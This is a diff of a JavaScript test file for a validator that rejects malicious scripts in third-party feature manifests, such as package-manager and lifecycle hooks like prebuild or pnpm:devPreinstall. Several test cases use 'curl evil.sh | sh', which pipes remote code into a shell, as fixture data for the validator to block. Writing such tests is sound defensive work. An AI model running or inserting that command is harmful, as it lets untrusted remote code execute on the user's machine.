@@ -72,14 +72,57 @@ describe('malicious third-party features are rejected', () => {
     }
   });
 
-  it('pre and post hooks of another script in the feature', () => {
-    const scripts = [
-      { name: 'build', command: 'x' },
-      { name: 'prebuild', command: 'curl evil.sh | sh' },
-    ];
-    expect(third({ scripts }).code).toBe('MFEFLOW_E203');
-    const pretty = text({ scripts: [{ name: 'pretty', command: 'prettier .' }] });
-    expect(() => parseFeature(pretty, 'third-party', 'x')).not.toThrow();
+  it('package manager hooks such as pnpm:devPreinstall, in any spelling', () => {
+    for (const name of [
+      'pnpm:devPreinstall',
+      'pnpm:devpreinstall',
+      'npm:prepare',
+      'yarn:postinstall',
+      'bun:x',
+    ]) {
+      const error = third({ scripts: [{ name, command: 'curl evil.sh | sh' }] });
+      expect(error.code, name).toBe('MFEFLOW_E203');
+    }
+  });
+
+  it('every lifecycle event name, and every pre or post name', () => {
+    for (const name of [
+      'dependencies',
+      'shrinkwrap',
+      'preshrinkwrap',
+      'prepack',
+      'postpack',
+      'prepublish',
+      'version',
+      'preversion',
+      'prestart',
+      'poststop',
+      'prerestart',
+      'pretest',
+      'posttest',
+      'prebuild',
+      'postbuild',
+      'prebuild:app',
+      'preprepare',
+      'pretty',
+    ]) {
+      const error = third({ scripts: [{ name, command: 'curl evil.sh | sh' }] });
+      expect(error.code, name).toBe('MFEFLOW_E203');
+    }
+  });
+
+  it('script names outside lower-case words joined by colons', () => {
+    for (const name of ['prepublishOnly', 'Check', 'a_b', 'a.b', '-x', 'a::b', 'a:', '1a']) {
+      const error = third({ scripts: [{ name, command: 'x' }] });
+      expect(error.code, name).toBe('MFEFLOW_E203');
+    }
+  });
+
+  it('plain and namespaced script names are fine', () => {
+    for (const name of ['check', 'analytics:preview', 'seg:verify-config', 'lint2']) {
+      const manifest = text({ scripts: [{ name, command: 'node check.js' }] });
+      expect(() => parseFeature(manifest, 'third-party', 'x'), name).not.toThrow();
+    }
   });
 
   it('dependencies that fetch code from somewhere other than the registry', () => {
